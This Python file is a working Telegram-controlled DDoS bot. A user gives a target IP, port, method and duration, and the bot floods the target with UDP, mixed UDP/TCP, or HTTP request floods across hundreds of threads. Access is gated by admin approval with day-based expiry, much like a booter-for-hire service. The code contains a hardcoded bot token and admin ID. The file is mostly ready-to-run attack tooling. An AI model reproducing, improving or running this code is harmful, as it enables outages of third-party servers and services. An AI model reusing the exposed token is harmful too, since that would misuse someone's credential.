# ddos_final_fixed.py
import asyncio
import logging
import threading
import time
import random
import socket
import re
import json
import os
from datetime import datetime, timedelta
from typing import Dict, Optional, List
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes
)
from functools import wraps

# ---------- Logging ----------
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------- Config ----------
BOT_TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_IDS = [8210011971]   # <-- Apni ID bhi daal do agar alag hai

BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001, 20002}
MIN_PORT, MAX_PORT = 1, 65535

# Attack power (3x max)
POWER_LEVEL = 3
THREADS_PER_LEVEL = {1: 100, 2: 200, 3: 300}
HTTP_THREADS = 100
SOCKETS_PER_THREAD = 3
DELAY_SEC = 0.0005

# Global attack state
attack_running = False
attack_threads = []
current_attack = {
    'ip': None, 'port': None, 'method': None, 'duration': 0,
    'start_time': 0, 'packets': 0, 'message_id': None
}
attack_lock = threading.Lock()
user_data = {}

# ---------- Simple JSON Database (No MongoDB) ----------
USERS_FILE = "users.json"

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def get_user(user_id):
    users = load_users()
    return users.get(str(user_id))

def create_user(user_id, username=""):
    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": datetime.now().isoformat()
        }
        save_users(users)
    return users[str(user_id)]

def approve_user(user_id, days):
    users = load_users()
    if str(user_id) in users:
        expires = (datetime.now() + timedelta(days=days)).isoformat()
        users[str(user_id)]["approved"] = True
        users[str(user_id)]["expires_at"] = expires
        save_users(users)
        return True
    return False

def is_user_approved(user_id):
    users = load_users()
    user = users.get(str(user_id))
    if not user or not user.get("approved"):
        return False
    expires = user.get("expires_at")
    if expires:
        if datetime.fromisoformat(expires) < datetime.now():
            return False
    return True

def log_attack(user_id, ip, port, duration, status, method, packets):
    # Just print log (can be saved to file if needed)
    logger.info(f"Attack logged: user={user_id} target={ip}:{port} duration={duration} method={method} packets={packets} status={status}")

def get_user_stats(user_id):
    # Simplified: return dummy stats
    return {"total": 0, "successful": 0, "failed": 0, "recent": []}

# ---------- Helper Functions ----------
def get_blocked_ports_list():
    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))

def admin_required(func):
    @wraps(func)
    async def wrapper(update, context, *args, **kwargs):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Unauthorized")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ---------- Attack Engines (same as before) ----------
def udp_flood(ip, port, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    port = int(port)
    socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except:
            pass
    payload = random._urandom(512)
    while time.time() < timeout and attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    current_attack['packets'] += 1
            except:
                pass
        time.sleep(DELAY_SEC)
    for sock in socks:
        sock.close()

def mixed_attack(ip, port, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    udp_socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socks.append(s)
        except:
            pass
    payload = random._urandom(512)
    while time.time() < timeout and attack_running:
        for sock in udp_socks:
            try:
                sock.sendto(payload, (ip, int(port)))
                with attack_lock:
                    current_attack['packets'] += 1
            except:
                pass
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect_ex((ip, int(port)))
            s.close()
            with attack_lock:
                current_attack['packets'] += 1
        except:
            pass
        time.sleep(DELAY_SEC)
    for sock in udp_socks:
        sock.close()

def http_emulate_flood(target_url, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    session = requests.Session()
    while time.time() < timeout and attack_running:
        try:
            url = f"{target_url}?rand={random.randint(1,999999)}"
            session.get(url, headers=headers, timeout=5, verify=False)
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(random.uniform(0.01, 0.05))
        except:
            time.sleep(0.2)
    session.close()

def http_connect_flood(target_url, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive',
    }
    session = requests.Session()
    reset_interval = 0.01
    while time.time() < timeout and attack_running:
        try:
            resp = session.get(target_url, headers=headers, timeout=5, stream=True)
            resp.close()
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(reset_interval)
        except:
            time.sleep(0.05)
    session.close()

# ---------- Attack Launcher with Inline Buttons ----------
def launch_attack(ip, port, duration, method, send_func):
    global attack_running, attack_threads, current_attack

    attack_running = True
    with attack_lock:
        current_attack = {
            'ip': ip, 'port': port, 'method': method, 'duration': duration,
            'start_time': time.time(), 'packets': 0, 'message_id': None
        }

    keyboard = [
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")],
        [InlineKeyboardButton("❌ CANCEL", callback_data="cancel_attack")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Select attack method
    if method == 'udp':
        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
        target_func = udp_flood
        target_args = (ip, port, duration)
    elif method == 'mixed':
        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
        target_func = mixed_attack
        target_args = (ip, port, duration)
    elif method == 'http_emulate':
        num_threads = HTTP_THREADS
        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        target_func = http_emulate_flood
        target_args = (target_url, duration)
    elif method == 'http_connect':
        num_threads = HTTP_THREADS
        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        target_func = http_connect_flood
        target_args = (target_url, duration)
    else:
        return

    # Send start message
    start_msg = send_func(
        f"🔥 *ATTACK STARTING* 🔥\n\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⚙️ Method: `{method.upper()}`\n"
        f"🧵 Threads: `{num_threads}`\n"
        f"⏱️ Duration: `{duration}s`\n\n"
        f"_Launching..._",
        reply_markup, edit=False
    )
    if start_msg:
        current_attack['message_id'] = start_msg.message_id

    # Launch threads
    attack_threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=target_func, args=target_args, daemon=True)
        t.start()
        attack_threads.append(t)

    # Monitor
    start_time = time.time()
    last_update = 0
    while attack_running and (time.time() - start_time) < duration:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        if time.time() - last_update >= 2:
            last_update = time.time()
            with attack_lock:
                pkt = current_attack['packets']
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            speed = int(pkt / elapsed) if elapsed else 0
            text = (
                f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"🧵 Threads: `{num_threads}`\n\n"
                f"🔘 *Buttons below*"
            )
            try:
                send_func(text, reply_markup, edit=True, msg_id=current_attack['message_id'])
            except:
                pass

    attack_running = False
    for t in attack_threads:
        t.join(0.5)
    with attack_lock:
        pkt = current_attack['packets']
    text = f"✅ *ATTACK COMPLETED* ✅\n\n🎯 `{ip}:{port}`\n📦 Total: `{pkt:,}`\n⏱️ Duration: `{duration}s`\n💥 Avg Speed: `{int(pkt/duration) if duration else 0:,}` pps"
    try:
        send_func(text, None, edit=True, msg_id=current_attack['message_id'])
    except:
        pass

    # Log to file (optional)
    log_attack(ADMIN_IDS[0], ip, port, duration, "success", method, pkt)

# ---------- Telegram Handlers ----------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    create_user(user_id, username)

    # Auto-approve if user is admin
    if user_id in ADMIN_IDS:
        if not is_user_approved(user_id):
            approve_user(user_id, 365)
            await update.message.reply_text("✅ You are admin. Auto-approved for 365 days.")

    if is_user_approved(user_id):
        user_data[user_id] = {'step': 'ip'}
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]]
        await update.message.reply_text(
            "⚡ *DDoS Bot Ready* ⚡\n\nSend target *IP address*:\nExample: `192.168.1.1`\n\n"
            f"🔥 Power: `{POWER_LEVEL}x` (L4 threads: {THREADS_PER_LEVEL[POWER_LEVEL]})\n"
            f"🌐 L7 threads: {HTTP_THREADS}\n"
            f"Use `/power 1-3` to change",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(
            "❌ *Access Denied*\n\nYour account is not approved. Contact admin.",
            parse_mode='Markdown'
        )

async def power_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global POWER_LEVEL
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    if not context.args:
        await update.message.reply_text(f"Current power: `{POWER_LEVEL}x` (1-3)", parse_mode='Markdown')
        return
    try:
        level = int(context.args[0])
        if level in [1,2,3]:
            POWER_LEVEL = level
            await update.message.reply_text(f"✅ Power set to `{level}x` (threads: {THREADS_PER_LEVEL[level]})")
        else:
            await update.message.reply_text("❌ Use 1,2,3")
    except:
        await update.message.reply_text("❌ Invalid")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    attack_running = False
    await update.message.reply_text("🛑 Attack stopped")

@admin_required
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("❌ /approve <user_id> <days>")
        return
    try:
        user_id = int(context.args[0])
        days = int(context.args[1])
        if approve_user(user_id, days):
            await update.message.reply_text(f"✅ User {user_id} approved for {days} days")
            try:
                await context.bot.send_message(user_id, f"✅ Approved for {days} days!")
            except:
                pass
        else:
            await update.message.reply_text("❌ User not found")
    except:
        await update.message.reply_text("❌ Invalid")

@admin_required
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = load_users()
    if not users:
        await update.message.reply_text("No users")
        return
    msg = "👥 *Users*\n\n"
    for uid, data in list(users.items())[:15]:
        status = "✅" if data.get("approved") else "❌"
        msg += f"`{uid}` {status} – {data.get('total_attacks',0)} attacks\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ Not found. Use /start first.")
        return
    status = "✅ Approved" if user.get("approved") else "❌ Not approved"
    expiry = user.get("expires_at")
    if expiry:
        exp_date = datetime.fromisoformat(expiry)
        days_left = (exp_date - datetime.now()).days
        expiry_str = f"{days_left} days" if days_left >= 0 else "Expired"
    else:
        expiry_str = "Never"
    await update.message.reply_text(
        f"📋 *Your Account*\n\n🆔 `{user_id}`\n👤 @{user.get('username','N/A')}\n📊 {status}\n⏰ Expires: {expiry_str}\n🎯 Attacks: {user.get('total_attacks',0)}",
        parse_mode='Markdown'
    )

async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🚫 *Blocked Ports*\n\n{get_blocked_ports_list()}", parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🤖 *Commands*\n"
        "/start – Begin attack\n"
        "/power 1-3 – Set threads\n"
        "/stop – Emergency stop\n"
        "/myinfo – Account\n"
        "/blockedports – Show blocked\n"
        "/help – This menu\n"
    )
    if update.effective_user.id in ADMIN_IDS:
        msg += "\n👑 *Admin*\n/approve <id> <days>\n/users"
    await update.message.reply_text(msg, parse_mode='Markdown')

# ---------- Message Handler for Attack Setup ----------
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_user_approved(user_id):
        await update.message.reply_text("❌ Not approved")
        return

    step_data = user_data.get(user_id, {})
    step = step_data.get('step')
    text = update.message.text.strip()

    if step == 'ip':
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
            await update.message.reply_text("❌ Invalid IP. Send again:")
            return
        step_data['ip'] = text
        step_data['step'] = 'port'
        user_data[user_id] = step_data
        await update.message.reply_text(f"🔌 Send *port* (1-65535):\n🚫 Blocked: {get_blocked_ports_list()}", parse_mode='Markdown')
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535 or port in BLOCKED_PORTS:
                await update.message.reply_text("❌ Invalid or blocked port")
                return
            step_data['port'] = port
            step_data['step'] = 'method'
            user_data[user_id] = step_data
            keyboard = [
                [InlineKeyboardButton("🔥 UDP", callback_data="method_udp")],
                [InlineKeyboardButton("💣 Mixed", callback_data="method_mixed")],
                [InlineKeyboardButton("🦊 HTTP-Emulate", callback_data="method_http_emulate")],
                [InlineKeyboardButton("⚡ HTTP-Connect", callback_data="method_http_connect")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
            ]
            await update.message.reply_text("⚡ Select attack method:", reply_markup=InlineKeyboardMarkup(keyboard))
        except:
            await update.message.reply_text("❌ Send a number")
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 5 or duration > 300:
                await update.message.reply_text("❌ Duration 5-300 seconds")
                return
            ip = step_data['ip']
            port = step_data['port']
            method = step_data.get('method', 'udp')
            step_data['final'] = (ip, port, duration, method)
            step_data['step'] = 'confirm'
            user_data[user_id] = step_data
            keyboard = [
                [InlineKeyboardButton("✅ START ATTACK", callback_data="confirm_start")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
            ]
            await update.message.reply_text(
                f"🔥 *Confirm Attack*\n\n🎯 `{ip}:{port}`\n⚙️ `{method.upper()}`\n⏱️ `{duration}s`\n\nStart?",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except:
            await update.message.reply_text("❌ Send number")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "cancel_setup":
        if user_id in user_data:
            del user_data[user_id]
        await query.edit_message_text("❌ Setup cancelled")
        return

    if data.startswith("method_"):
        method = data.replace("method_", "")
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]['method'] = method
        user_data[user_id]['step'] = 'duration'
        await query.edit_message_text(f"✅ Method: `{method.upper()}`\n⏱️ Send duration (5-300s):", parse_mode='Markdown')
        return

    if data == "confirm_start":
        if user_id not in user_data or 'final' not in user_data[user_id]:
            await query.edit_message_text("❌ Session expired. Use /start")
            return
        ip, port, duration, method = user_data[user_id]['final']
        del user_data[user_id]

        # Async to sync callback for attack thread
        loop = asyncio.get_event_loop()
        def sync_send(text, markup, edit=False, msg_id=None):
            future = asyncio.run_coroutine_threadsafe(
                query.message.reply_text(text, parse_mode='Markdown', reply_markup=markup), loop
            )
            return future.result() if future.result() else None

        threading.Thread(target=launch_attack, args=(ip, port, duration, method, sync_send), daemon=True).start()
        await query.edit_message_text("🔥 Attack initializing...")
        return

    # Attack control buttons
    global attack_running, current_attack
    if data == "stop_attack":
        if attack_running:
            attack_running = False
            await query.edit_message_text("🛑 Stopped")
        else:
            await query.answer("No attack")
    elif data == "info_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start_time'])
                remaining = current_attack['duration'] - elapsed
                speed = int(pkt/elapsed) if elapsed else 0
                await query.edit_message_text(
                    f"ℹ️ *Info*\n\n🎯 `{current_attack['ip']}:{current_attack['port']}`\n📦 `{pkt:,}`\n⏱️ `{elapsed}/{current_attack['duration']}s`\n💥 `{speed:,}` pps",
                    parse_mode='Markdown'
                )
        else:
            await query.edit_message_text("ℹ️ No attack")
    elif data == "refresh_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start_time'])
                remaining = current_attack['duration'] - elapsed
                progress = int((elapsed / current_attack['duration']) * 20)
                bar = "█" * progress + "░" * (20 - progress)
                speed = int(pkt/elapsed) if elapsed else 0
                text = (
                    f"🔥 *ATTACK* 🔥\n\n🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
                    f"📦 `{pkt:,}` | ⏱️ `{elapsed}/{current_attack['duration']}s`\n"
                    f"📊 `[{bar}]`\n💥 `{speed:,}` pps\n\n*Buttons below*"
                )
                keyboard = [
                    [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
                    [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")],
                ]
                await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await query.edit_message_text("✅ No attack")
    elif data == "cancel_attack":
        if user_id in user_data:
            del user_data[user_id]
        await query.edit_message_text("❌ Cancelled")

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")

# ---------- Main ----------
def main():
    print("⚡ DDoS Bot (Standalone - JSON storage)")
    print(f"Admins: {ADMIN_IDS}")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("power", power_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("myinfo", myinfo_command))
    app.add_handler(CommandHandler("blockedports", blocked_ports_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("approve", approve_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)
    print("✅ Bot is running!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
